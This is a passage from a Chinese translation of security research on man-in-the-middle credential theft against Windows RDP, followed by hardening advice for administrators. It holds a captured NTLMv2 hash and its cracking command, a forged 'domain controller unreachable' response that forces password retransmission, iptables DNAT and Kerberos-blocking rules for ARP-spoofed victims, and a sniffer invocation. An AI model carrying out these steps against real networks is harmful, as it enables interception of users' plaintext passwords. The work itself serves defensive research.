00000040:&nbsp;63&nbsp;44&nbsp;6E&nbsp;2C&nbsp;01&nbsp;0C&nbsp;10&nbsp;00&nbsp;04&nbsp;00&nbsp;08&nbsp;00&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;cDn,............
00000050:&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;03&nbsp;0C&nbsp;10&nbsp;00&nbsp;EB&nbsp;03&nbsp;04&nbsp;00&nbsp;EC&nbsp;03&nbsp;ED&nbsp;03&nbsp;................
00000060:&nbsp;EE&nbsp;03&nbsp;EF&nbsp;03&nbsp;02&nbsp;0C&nbsp;0C&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;................</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后，客户端可以将该值与最初在第一个请求中发送的值进行比较，如果不匹配，则终止连接。显然，这时已经太晚了。我们作为中间人，可以通过用其原始值（在这种情况下为0x03）替换相应字节（在偏移量为0x4C处的高亮显示字节）来隐藏来自客户端的伪协商请求。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之后，我们可以毫无阻碍的侦听一切流量了。好了，继续努力。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如预期的那样，受害者这里看到的是SSL警告。但这事仍然不够圆满。因为在建立RDP连接之前，没有提示我们输入凭据，而是直接显示了Windows登录屏幕。与NLA不同，认证是在会话内部进行的。同样，这仍然有别于典型的管理工作流程，很容易被精明的用户觉察到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">突破CredSSP协议&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">好吧，我承认：这里我们没有直接攻陷CredSSP协议。但我们会找到一种方法来绕过它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，让我们看看如果我们不降低连接的安全等级的话，会发生什么。这时，发送到服务器的相关消息如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">From&nbsp;client:
00000000:&nbsp;30&nbsp;82&nbsp;02&nbsp;85&nbsp;A0&nbsp;03&nbsp;02&nbsp;01&nbsp;04&nbsp;A1&nbsp;82&nbsp;01&nbsp;DA&nbsp;30&nbsp;82&nbsp;01&nbsp;0............0..
00000010:&nbsp;D6&nbsp;30&nbsp;82&nbsp;01&nbsp;D2&nbsp;A0&nbsp;82&nbsp;01&nbsp;CE&nbsp;04&nbsp;82&nbsp;01&nbsp;CA&nbsp;4E&nbsp;54&nbsp;4C&nbsp;.0...........NTL
00000020:&nbsp;4D&nbsp;53&nbsp;53&nbsp;50&nbsp;00&nbsp;03&nbsp;00&nbsp;00&nbsp;00&nbsp;18&nbsp;00&nbsp;18&nbsp;00&nbsp;74&nbsp;00&nbsp;00&nbsp;MSSP.........t..
00000030:&nbsp;00&nbsp;2E&nbsp;01&nbsp;2E&nbsp;01&nbsp;8C&nbsp;00&nbsp;00&nbsp;00&nbsp;08&nbsp;00&nbsp;08&nbsp;00&nbsp;58&nbsp;00&nbsp;00&nbsp;.............X..
00000040:&nbsp;00&nbsp;0A&nbsp;00&nbsp;0A&nbsp;00&nbsp;60&nbsp;00&nbsp;00&nbsp;00&nbsp;0A&nbsp;00&nbsp;0A&nbsp;00&nbsp;6A&nbsp;00&nbsp;00&nbsp;.....`.......j..
00000050:&nbsp;00&nbsp;10&nbsp;00&nbsp;10&nbsp;00&nbsp;BA&nbsp;01&nbsp;00&nbsp;00&nbsp;35&nbsp;82&nbsp;88&nbsp;E2&nbsp;0A&nbsp;00&nbsp;39&nbsp;.........5.....9
00000060:&nbsp;38&nbsp;00&nbsp;00&nbsp;00&nbsp;0F&nbsp;6D&nbsp;49&nbsp;C4&nbsp;55&nbsp;46&nbsp;C0&nbsp;67&nbsp;E4&nbsp;B4&nbsp;5D&nbsp;86&nbsp;8....mI.UF.g..].
00000070:&nbsp;8A&nbsp;FC&nbsp;3B&nbsp;59&nbsp;94&nbsp;52&nbsp;00&nbsp;44&nbsp;00&nbsp;31&nbsp;00&nbsp;34&nbsp;00&nbsp;55&nbsp;00&nbsp;73&nbsp;..;Y.R.D.1.4.U.s
00000080:&nbsp;00&nbsp;65&nbsp;00&nbsp;72&nbsp;00&nbsp;31&nbsp;00&nbsp;57&nbsp;00&nbsp;49&nbsp;00&nbsp;4E&nbsp;00&nbsp;31&nbsp;00&nbsp;30&nbsp;.e.r.1.W.I.N.1.0
00000090:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;................
000000A0:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;11&nbsp;0D&nbsp;65&nbsp;8E&nbsp;92&nbsp;7F&nbsp;07&nbsp;...........e....
000000B0:&nbsp;7B&nbsp;04&nbsp;02&nbsp;04&nbsp;0C&nbsp;C1&nbsp;A6&nbsp;B6&nbsp;EF&nbsp;01&nbsp;01&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;{...............
000000C0:&nbsp;00&nbsp;D5&nbsp;FD&nbsp;A8&nbsp;7C&nbsp;EC&nbsp;95&nbsp;D2&nbsp;01&nbsp;A7&nbsp;55&nbsp;9D&nbsp;44&nbsp;F4&nbsp;31&nbsp;84&nbsp;....|.....U.D.1.
000000D0:&nbsp;8A&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;02&nbsp;00&nbsp;08&nbsp;00&nbsp;52&nbsp;00&nbsp;44&nbsp;00&nbsp;31&nbsp;00&nbsp;34&nbsp;.........R.D.1.4
000000E0:&nbsp;00&nbsp;01&nbsp;00&nbsp;08&nbsp;00&nbsp;44&nbsp;00&nbsp;43&nbsp;00&nbsp;30&nbsp;00&nbsp;31&nbsp;00&nbsp;04&nbsp;00&nbsp;14&nbsp;.....D.C.0.1....
000000F0:&nbsp;00&nbsp;72&nbsp;00&nbsp;64&nbsp;00&nbsp;31&nbsp;00&nbsp;34&nbsp;00&nbsp;2E&nbsp;00&nbsp;6C&nbsp;00&nbsp;6F&nbsp;00&nbsp;63&nbsp;.r.d.1.4...l.o.c
00000100:&nbsp;00&nbsp;61&nbsp;00&nbsp;6C&nbsp;00&nbsp;03&nbsp;00&nbsp;1E&nbsp;00&nbsp;64&nbsp;00&nbsp;63&nbsp;00&nbsp;30&nbsp;00&nbsp;31&nbsp;.a.l.....d.c.0.1
00000110:&nbsp;00&nbsp;2E&nbsp;00&nbsp;72&nbsp;00&nbsp;64&nbsp;00&nbsp;31&nbsp;00&nbsp;34&nbsp;00&nbsp;2E&nbsp;00&nbsp;6C&nbsp;00&nbsp;6F&nbsp;...r.d.1.4...l.o
00000120:&nbsp;00&nbsp;63&nbsp;00&nbsp;61&nbsp;00&nbsp;6C&nbsp;00&nbsp;05&nbsp;00&nbsp;14&nbsp;00&nbsp;72&nbsp;00&nbsp;64&nbsp;00&nbsp;31&nbsp;.c.a.l.....r.d.1
00000130:&nbsp;00&nbsp;34&nbsp;00&nbsp;2E&nbsp;00&nbsp;6C&nbsp;00&nbsp;6F&nbsp;00&nbsp;63&nbsp;00&nbsp;61&nbsp;00&nbsp;6C&nbsp;00&nbsp;07&nbsp;.4...l.o.c.a.l..
00000140:&nbsp;00&nbsp;08&nbsp;00&nbsp;D5&nbsp;FD&nbsp;A8&nbsp;7C&nbsp;EC&nbsp;95&nbsp;D2&nbsp;01&nbsp;06&nbsp;00&nbsp;04&nbsp;00&nbsp;02&nbsp;......|.........
00000150:&nbsp;00&nbsp;00&nbsp;00&nbsp;08&nbsp;00&nbsp;30&nbsp;00&nbsp;30&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;.....0.0........
00000160:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;20&nbsp;00&nbsp;00&nbsp;4C&nbsp;FA&nbsp;6E&nbsp;96&nbsp;10&nbsp;9B&nbsp;D9&nbsp;0F&nbsp;6A&nbsp;....&nbsp;..L.n.....j
00000170:&nbsp;40&nbsp;80&nbsp;DA&nbsp;AA&nbsp;8E&nbsp;26&nbsp;4E&nbsp;4E&nbsp;BF&nbsp;AF&nbsp;FA&nbsp;E9&nbsp;E3&nbsp;68&nbsp;AF&nbsp;78&nbsp;@....&amp;NN.....h.x
00000180:&nbsp;7F&nbsp;53&nbsp;E3&nbsp;89&nbsp;D9&nbsp;6B&nbsp;18&nbsp;0A&nbsp;00&nbsp;10&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;.S...k..........
00000190:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;09&nbsp;00&nbsp;2C&nbsp;00&nbsp;54&nbsp;.............,.T
000001A0:&nbsp;00&nbsp;45&nbsp;00&nbsp;52&nbsp;00&nbsp;4D&nbsp;00&nbsp;53&nbsp;00&nbsp;52&nbsp;00&nbsp;56&nbsp;00&nbsp;2F&nbsp;00&nbsp;31&nbsp;.E.R.M.S.R.V./.1
000001B0:&nbsp;00&nbsp;39&nbsp;00&nbsp;32&nbsp;00&nbsp;2E&nbsp;00&nbsp;31&nbsp;00&nbsp;36&nbsp;00&nbsp;38&nbsp;00&nbsp;2E&nbsp;00&nbsp;34&nbsp;.9.2...1.6.8...4
000001C0:&nbsp;00&nbsp;30&nbsp;00&nbsp;2E&nbsp;00&nbsp;31&nbsp;00&nbsp;37&nbsp;00&nbsp;39&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;.0...1.7.9......
000001D0:&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;19&nbsp;0A&nbsp;F7&nbsp;ED&nbsp;0C&nbsp;45&nbsp;C0&nbsp;80&nbsp;73&nbsp;............E..s
000001E0:&nbsp;53&nbsp;74&nbsp;1A&nbsp;AB&nbsp;AF&nbsp;13&nbsp;B4&nbsp;A3&nbsp;81&nbsp;9F&nbsp;04&nbsp;81&nbsp;9C&nbsp;01&nbsp;00&nbsp;00&nbsp;St..............
000001F0:&nbsp;00&nbsp;7F&nbsp;38&nbsp;FE&nbsp;A6&nbsp;32&nbsp;5E&nbsp;4E&nbsp;57&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;42&nbsp;B4&nbsp;6E&nbsp;..8..2^NW....B.n
00000200:&nbsp;39&nbsp;09&nbsp;AA&nbsp;CC&nbsp;8F&nbsp;04&nbsp;71&nbsp;5C&nbsp;54&nbsp;CF&nbsp;AD&nbsp;E0&nbsp;A0&nbsp;58&nbsp;AA&nbsp;06&nbsp;9.....q\T....X..
00000210:&nbsp;B2&nbsp;F0&nbsp;0A&nbsp;33&nbsp;05&nbsp;03&nbsp;54&nbsp;60&nbsp;FB&nbsp;E1&nbsp;68&nbsp;FC&nbsp;F5&nbsp;0D&nbsp;A9&nbsp;C0&nbsp;...3..T`..h.....
00000220:&nbsp;D9&nbsp;57&nbsp;BA&nbsp;43&nbsp;F2&nbsp;92&nbsp;F7&nbsp;6F&nbsp;32&nbsp;74&nbsp;4E&nbsp;86&nbsp;CD&nbsp;7F&nbsp;F0&nbsp;3B&nbsp;.W.C...o2tN....;
00000230:&nbsp;DD&nbsp;A4&nbsp;A4&nbsp;67&nbsp;0A&nbsp;B7&nbsp;7E&nbsp;64&nbsp;0B&nbsp;63&nbsp;D7&nbsp;4B&nbsp;F7&nbsp;C6&nbsp;B7&nbsp;8F&nbsp;...g..~d.c.K....
00000240:&nbsp;21&nbsp;15&nbsp;9D&nbsp;EA&nbsp;3E&nbsp;E1&nbsp;1A&nbsp;50&nbsp;AB&nbsp;AA&nbsp;D3&nbsp;6E&nbsp;46&nbsp;9D&nbsp;68&nbsp;6E&nbsp;!...&gt;..P...nF.hn
00000250:&nbsp;2A&nbsp;EA&nbsp;44&nbsp;5C&nbsp;E0&nbsp;51&nbsp;1D&nbsp;41&nbsp;B4&nbsp;13&nbsp;EB&nbsp;B9&nbsp;90&nbsp;E8&nbsp;75&nbsp;AD&nbsp;*.D\.Q.A......u.
00000260:&nbsp;A0&nbsp;99&nbsp;4E&nbsp;F2&nbsp;A5&nbsp;99&nbsp;D4&nbsp;8D&nbsp;2A&nbsp;11&nbsp;73&nbsp;F1&nbsp;95&nbsp;FC&nbsp;7E&nbsp;A0&nbsp;..N.....*.s...~.
00000270:&nbsp;06&nbsp;FD&nbsp;13&nbsp;DB&nbsp;D0&nbsp;3B&nbsp;7A&nbsp;B4&nbsp;41&nbsp;97&nbsp;B6&nbsp;94&nbsp;D4&nbsp;11&nbsp;62&nbsp;F5&nbsp;.....;z.A.....b.
00000280:&nbsp;4C&nbsp;06&nbsp;BE&nbsp;03&nbsp;9C&nbsp;0F&nbsp;55&nbsp;0E&nbsp;3C&nbsp;L.....U.&amp;lt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我高亮显示了客户端质询和NTLM的应答，两者是彼此相邻的。服务器质询位于服务器的上一条消息中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们在这里看到的是NTLM身份验证[15]。这是一种质询-应答技术，其中客户端会将服务器质询（类似于Server Random）、客户端质询以及用户密码的哈希值以及一些其他值映射为加密哈希值。这个值称为“NTLM应答”，然后将其传输到服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个值的计算细节对我们来说并不重要。我们唯一需要知道的是，它不能用于重放攻击或用于哈希值传递攻击。但它可能会遭受密码猜测攻击！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">底层的哈希算法是HMAC-MD5，这是一个相当差劲的哈希算法（所以我们可以每秒猜测大量值），但它仍然使用了salt（用来对付彩虹表）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们现在可以尝试用Hashcat [17]或者John Ripper [18]来破解它。John的哈希格式为[16]：&nbsp;</span></p><pre class="brush:plain;toolbar:false">&lt;Username&gt;::&lt;Domain&gt;:&lt;ServerChallenge&gt;:&lt;ClientChallenge&gt;:&lt;NTLMResponse&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在本例中，我们有：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">User1::RD14:a5f46f6489dc654f:110d658e927f077b0402040cc1a6b6ef:0101000000000
000d5fda87cec95d201a7559d44f431848a0000000002000800520044003100340001000800
44004300300031000400140072006400310034002e006c006f00630061006c0003001e00640
06300300031002e0072006400310034002e006c006f00630061006c00050014007200640031
0034002e006c006f00630061006c0007000800d5fda87cec95d201060004000200000008003
000300000000000000000000000002000004cfa6e96109bd90f6a4080daaa8e264e4ebfaffa
e9e368af787f53e389d96b180a0010000000000000000000000000000000000009002c00540
0450052004d005300520056002f003100390032002e003100360038002e00340030002e0031
0037003900000000000000000000000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果我们把这个哈希值放在一个名为hashes.txt的文件中，那么可以通过下列命令来进行验证：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;echo&nbsp;&#39;S00perS3cretPa$$word&#39;&nbsp;|&nbsp;./john&nbsp;--format=netntlmv2&nbsp;--stdin&nbsp;hashes.txt
Using&nbsp;default&nbsp;input&nbsp;encoding:&nbsp;UTF-8
Loaded&nbsp;1&nbsp;password&nbsp;hash&nbsp;(netntlmv2,&nbsp;NTLMv2&nbsp;C/R&nbsp;[MD4&nbsp;HMAC-MD5&nbsp;32/64])
Will&nbsp;run&nbsp;8&nbsp;OpenMP&nbsp;threads
Press&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;or&nbsp;send&nbsp;SIGUSR1&nbsp;to&nbsp;john&nbsp;process&nbsp;for&nbsp;status
S00perS3cretPa$$word&nbsp;(User1)
1g&nbsp;0:00:00:00&nbsp;33.33g/s&nbsp;33.33p/s&nbsp;33.33c/s&nbsp;33.33C/s&nbsp;S00perS3cretPa$$word
Use&nbsp;the&nbsp;&quot;--show&quot;&nbsp;option&nbsp;to&nbsp;display&nbsp;all&nbsp;of&nbsp;the&nbsp;cracked&nbsp;passwords&nbsp;reliably
Session&nbsp;completed</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">虽然不是很理想，但是总比什么都没有强。不过，实际上我们可以做得更好。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们需要问自己的问题是：服务器是如何验证NTLM应答的？它会咨询域控制器。那么，如果域控制器不可用呢？ 它会说“算了，让我们使用增强型RDP安全协议吧，不用NLA了”，客户端也会言听计从。但是有趣的是：由于客户端已经缓存了用户的密码，所以它会直接传输它，而不是将用户引导至Windows登录屏幕！ 这正是我们想要的。这样除了SSL警告之外，就没有任何可疑的东西引起受害者的注意了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以，我们要做的事情是：当客户端发送它的NTLM应答后，我们将服务器的响应替换为：&nbsp;</span></p><pre class="brush:plain;toolbar:false">00000000:&nbsp;300d&nbsp;a003&nbsp;0201&nbsp;04a4&nbsp;0602&nbsp;04c0&nbsp;0000&nbsp;5e&nbsp;0.............^</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我没有找到与此有关的文档，但它的确是无法联系域控制器时的服务器响应。客户端将返回到增强型RDP安全协议，并显示SSL警告，同时将SSL隧道内的密码传输到服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">请注意，我们没有收到SSL警告。根据规范[19]，客户端将SSL证书的指纹发送到使用由CredSSP协议协商的密钥加密的服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果它与服务器证书的指纹不匹配，那么会话将会被终止。这就是为什么即使受害者提供不正确的凭据也不要紧的原因—— 我们可以看到（不正确的）密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是，如果密码正确，我们将观察到一个TLS内部错误。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我想出的解决方法是直接篡改NTLM应答。我对Python脚本进行了相应的修改，通过更改NTLM应答让NTLM身份验证总是失败。不过，受害者是不会注意到这一点的，因为正如我们刚才看到的，我们可以将连接降级到TLS，这样会重新传输凭据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是，还有一件事需要注意。如果客户端会显示正在尝试连接一台加入域的计算机，那么它就不会使用NTLM，而是使用Kerberos，这意味着它将在建立RDP连接之前与域控制器联系以请求相应的ticket。这是一件好事，因为Kerberos的ticket对攻击者而言，要比没有“盐化”的NTLM应答更加微不足道。但是，如果攻击者处于MitM位置，那么他就可以阻止针对Kerberos服务的所有请求。如果客户端无法联系Kerberos服务，那会发生什么呢？实际上，它会退回到NTLM。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将这种攻击技术武器化&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">到目前为止，我们一直在实验室环境下进行的。所以，受害者在RDP客户端中输入的不是我们的IP，而是他们自己的服务器的IP或主机名。有多种方法可以让我们成为中间人，但在这里我们将利用ARP欺骗。这种方法并不难，过一会儿就给出一个概念证明式的演示。由于这种攻击是在网络协议的第二层进行的，所以要求我们必须与受害者在同一个子网中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在我们欺骗ARP回复并启用IPv4流量转发后，受害者和网关之间的所有通信都将通过我们的计算机。由于仍然不知道受害者输入的IP地址，所以仍然无法运行我们的Python脚本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们创建一个iptables规则，丢弃受害者用于RDP服务器的SYN数据包：&nbsp;</span></p><pre class="brush:plain;toolbar:false">$&nbsp;iptables&nbsp;-A&nbsp;FORWARD&nbsp;-p&nbsp;tcp&nbsp;-s&nbsp;&quot;$VICTIM_IP&quot;&nbsp;--syn&nbsp;--dport&nbsp;3389&nbsp;-j&nbsp;REJECT</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们不想重定向其他任何流量，因为受害者可能正在使用已建立的RDP连接，否则就会发生中断。如果我们这里不丢弃那些数据包的话，受害者就会与真正的主机建立连接，而我们则想让受害者与我们建立连接。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二，我们等待来自受害者目的地端口为3389的TCP SYN分组，以便掌握原始目的地主机的地址。为此，我们可以使用tcpdump：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;tcpdump&nbsp;-n&nbsp;-c&nbsp;1&nbsp;-i&nbsp;&quot;$IFACE&quot;&nbsp;src&nbsp;host&nbsp;&quot;$VICTIM_IP&quot;&nbsp;and&nbsp;\
&quot;tcp[tcpflags]&nbsp;&amp;&nbsp;tcp-syn&nbsp;!=&nbsp;0&quot;&nbsp;and&nbsp;\
dst&nbsp;port&nbsp;3389&nbsp;2&gt;&nbsp;/dev/null&nbsp;|&nbsp;\
sed&nbsp;-e&nbsp;&#39;s/.*&gt;&nbsp;\([0-9.]*\)\.3389:.*/\1/&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">选项-c 1告诉tcpdump在第一个匹配数据包之后退出。这个SYN包将被丢弃，但这并不重要，因为受害者的系统很快就会再次尝试发送。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第三，我们将检索RDP服务器的SSL证书，并创建一个与原始证书具有相同公用名的新的自签名证书。我们还可以修正证书的到期日期，除非您对其指纹进行长时间的细致检查，否则它与原始文件很难区分。为此，我编写了一个小型的Bash脚本[23]来处理这项工作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在我们删除前面的iptables规则，并将受害者发送给RDP主机的TCP流量重定向到我们的IP地址：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;iptables&nbsp;-t&nbsp;nat&nbsp;-A&nbsp;PREROUTING&nbsp;-p&nbsp;tcp&nbsp;-d&nbsp;&quot;$ORIGINAL_DEST&quot;&nbsp;\
-s&nbsp;&quot;$VICTIM_IP&quot;&nbsp;--dport&nbsp;3389&nbsp;-j&nbsp;DNAT&nbsp;--to-destination&nbsp;&quot;$ATTACKER_IP&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了强制从Kerberos降级到NTLM，我们可以将受害者发送到88端口的所有TCP流量全部拦截：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;iptables&nbsp;-A&nbsp;INPUT&nbsp;-p&nbsp;tcp&nbsp;-s&nbsp;&quot;$VICTIM_IP&quot;&nbsp;--dport&nbsp;88&nbsp;\
-j&nbsp;REJECT&nbsp;--reject-with&nbsp;tcp-reset</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这样，我们就掌握了运行Python脚本所需的全部信息：&nbsp;</span></p><pre class="brush:plain;toolbar:false">$&nbsp;rdp-cred-sniffer.py&nbsp;-c&nbsp;&quot;$CERTPATH&quot;&nbsp;-k&nbsp;&quot;$KEYPATH&quot;&nbsp;&quot;$ORIGINAL_DEST&quot;</pre><p style="text-align:center"><img src="http://p3.qhimg.com/t01b5c3a358267af43d.png" title="t010cc7f4ab7a935017.png" alt="http://p5.qhimg.com/t010cc7f4ab7a935017.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图6：左侧：受害者看到的域控制器的RDP会话。右侧：攻击者看到的明文密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">建议&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">那么，作为系统管理员你可能想知道，应该采取哪些行动来保护自己网络的安全。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，如果服务器的身份不能被验证，即如果SSL证书没有被可信证书颁发机构（CA）签名，则拒绝RDP连接是绝对关键的。您必须使用企业CA来签署所有服务器证书。如果无法验证证书，则客户端必须通过GPO [22]配置为禁止连接：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在服务器端是否执行CredSSP（NLA）的问题是非常棘手的。为了便于记录，这也可以作为组策略[20]推出：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们已经看到，客户端会缓存用户的凭据，以便在NLA不可用的情况下方便地重新传输它们——我们知道，这些凭据就位于内存中。因此，它们可能被具有SYSTEM权限的攻击者读取，例如使用Mimikatz [24]等。这是一个令人难以置信的常见网络攻击情形：攻陷一台机器，利用Mimikatz提取登录用户的明文凭证，并通过横向运动攻击其他帐户，直到找到域管理员密码为止。这就是为什么你只能在域控制器上使用你的个人域管理员帐户，而不应该在其他地方使用的原因。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是如果使用RDP远程进入域控制器则会在工作站上留下高权限帐户的痕迹，这是一个严重的问题。此外，如果您强制执行NLA，在启用“用户必须在下次登录时更改密码”选项后，那么只能使用终端服务器的用户会被锁定。我们知道，NLA的唯一优点是更轻便，可以减轻拒绝服务攻击的影响，因为它占用较少的资源，并且可以保护RDP免受基于网络的攻击，如MS12-020 [25]。这就是为什么目前我们正在讨论是否建议禁用RDA的NLA的原因。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果您希望避免使用NLA，请将组策略“要求为远程连接使用特定安全层”设置为SSL [20]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了进一步增加RDP连接的安全性，您可以采取的另一项措施是，除了用户凭证之外，为用户验证添加其他验证因子。目前有许多相关的第三方产品，至少在保护关键系统如域控制器的时候，您可以考虑这一措施。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果你的Linux机器是通过RDP连接到Windows终端服务器的话，我需要提醒的是，流行的RDP客户端rdesktop不支持NLA，并且根本不对SSL证书进行验证。所以我建议使用xfreerdp，至少它会验证SSL证书。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后，鼓励大家对您的同事和用户不断重申：不要轻视SSL警告，无论是在RDP或HTTPS或其他任何情况下。作为管理员，您有责任确保您的客户端系统在受信任的CA列表中含有您的根CA。这样，这些警告就属于异常，需要马上通知IT部门。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft 